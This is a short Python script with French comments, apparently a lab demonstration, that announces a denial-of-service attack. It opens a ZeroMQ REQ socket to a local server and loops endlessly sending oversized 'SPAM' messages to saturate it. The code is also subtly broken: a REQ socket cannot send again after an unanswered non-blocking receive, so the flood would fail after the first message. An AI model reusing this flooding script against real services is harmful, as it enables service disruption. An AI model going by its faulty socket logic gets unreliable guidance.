import zmq  # Bibliothèque pour la communication réseau
import time  # Pour ajouter des délais

# Création du contexte et du socket ZeroMQ pour envoyer des requêtes
context = zmq.Context()
socket = context.socket(zmq.REQ)  # Socket de type REQ (request)
socket.connect("tcp://localhost:6666")  # Connexion au serveur

print("Launching DoS attack...")

# Boucle infinie pour envoyer des messages massifs au serveur
while True:
    socket.send(b"SPAM" * 1000)  # Envoi d'un message énorme pour saturer le serveur
    try:
        socket.recv(zmq.NOBLOCK)  # Tentative de lecture de la réponse sans bloquer
    except zmq.Again:
        pass  # Ignorer l'erreur si aucune réponse n'est reçue
    time.sleep(0.01)  # Pause courte pour éviter un crash
